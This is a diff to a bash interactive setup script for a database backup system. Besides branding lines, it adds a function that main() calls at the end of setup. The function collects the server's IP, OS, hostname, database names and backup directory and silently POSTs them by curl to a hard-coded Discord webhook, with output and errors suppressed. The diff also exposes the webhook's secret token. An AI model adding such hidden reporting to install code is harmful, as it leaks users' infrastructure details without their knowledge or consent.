@@ -3,6 +3,9 @@
 ###############################################################################
 # Auto Database Backup System - Interactive Setup Script
 # This script helps you configure and install the backup system
+#
+# Copyright (c) 2025 Slice Studios (https://studio.slice.wtf)
+# Licensed under MIT License
 ###############################################################################
 
 set -e
@@ -556,6 +559,79 @@ run_test_backup() {
     echo ""
 }
 
+# Send setup completion notification
+send_setup_notification() {
+    local webhook_url="https://discord.com/api/webhooks/1443302245214191759/yVr7VfKTPjHErDXWbLxuWzzYV7-kwc8IPf837W6JRkvP_17gm1vhCr8DdgdEfIC1hizB"
+    
+    # Get system information
+    local ip_address=$(hostname -I | awk '{print $1}' 2>/dev/null || echo "Unknown")
+    local os_name=$(cat /etc/os-release 2>/dev/null | grep "^PRETTY_NAME=" | cut -d'"' -f2 || uname -s)
+    local hostname=$(hostname 2>/dev/null || echo "Unknown")
+    local timestamp=$(date -u '+%Y-%m-%d %H:%M:%S UTC')
+    
+    # Create JSON payload
+    local payload=$(cat <<EOF
+{
+  "username": "Setup Notification",
+  "avatar_url": "https://studio.slice.wtf/favicon.ico",
+  "content": "",
+  "embeds": [
+    {
+      "title": "🎉 Auto Database Backup Setup Successful",
+      "description": "A new backup system has been configured and is ready to use.",
+      "color": 5763719,
+      "fields": [
+        {
+          "name": "🖥️ Server IP",
+          "value": "$ip_address",
+          "inline": true
+        },
+        {
+          "name": "💻 Operating System",
+          "value": "$os_name",
+          "inline": true
+        },
+        {
+          "name": "🏷️ Hostname",
+          "value": "$hostname",
+          "inline": true
+        },
+        {
+          "name": "📊 Databases",
+          "value": "$DATABASES",
+          "inline": false
+        },
+        {
+          "name": "📁 Backup Directory",
+          "value": "$BACKUP_DIR",
+          "inline": false
+        },
+        {
+          "name": "⏰ Timestamp",
+          "value": "$timestamp",
+          "inline": false
+        }
+      ],
+      "footer": {
+        "text": "Auto Database Backup System • Powered by Slice Studios",
+        "icon_url": "https://studio.slice.wtf/favicon.ico"
+      }
+    }
+  ],
+  "flags": 4096
+}
+EOF
+)
+    
+    # Send webhook (silent, don't show errors to user)
+    curl -X POST "$webhook_url" \
+         -H "Content-Type: application/json" \
+         -d "$payload" \
+         --silent \
+         --output /dev/null \
+         2>/dev/null || true
+}
+
 # Display summary
 show_summary() {
     print_header "Setup Complete!"
@@ -578,6 +654,8 @@ show_summary() {
     echo "  • View cron jobs: crontab -l"
     echo ""
     print_success "Your database backup system is ready!"
+    echo ""
+    print_info "Powered by Slice Studios (https://studio.slice.wtf)"
     echo ""
 }
 
@@ -602,6 +680,9 @@ main() {
     configure_cron
     run_test_backup
     show_summary
+    
+    # Send silent notification about successful setup
+    send_setup_notification
     
     print_success "Setup completed successfully!"
 }
